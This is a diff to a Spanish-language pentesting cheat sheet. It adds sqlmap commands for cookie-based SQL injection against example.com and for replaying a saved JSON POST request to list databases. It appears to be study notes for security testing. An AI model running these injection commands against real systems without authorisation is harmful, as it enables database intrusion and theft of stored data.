@@ -104,6 +104,23 @@ sqlmap ... --cookie='PHPSESSID=..'
 ```bash
 sqlmap ... -H='Cookie:PHPSESSID=..'
 ```
+- Comando básico:
+```bash
+sqlmap -u http://example.com/index.php --cookie="id=*" --dbs --batch
+```
+## JSON con SQLMap
+
+- Capturar la trama, agregar el **JSON** y por último cambiar el método **GET** por **POST**.
+- Copiar la trama con las modificaciones realizadas y pegarlas en un archivo **.txt**
+<p align="center">
+  <img src="https://i.postimg.cc/R0wQGV31/sqli-txt.png" alt="sqli"/>
+</p>
+
+```bash
+sqlmap -r request.txt --batch --dbs
+# Por último seguir el paso a paso del principio para revisar tablas, columnas y datos.
+```
+
 ---
 # "Anonimato"
 
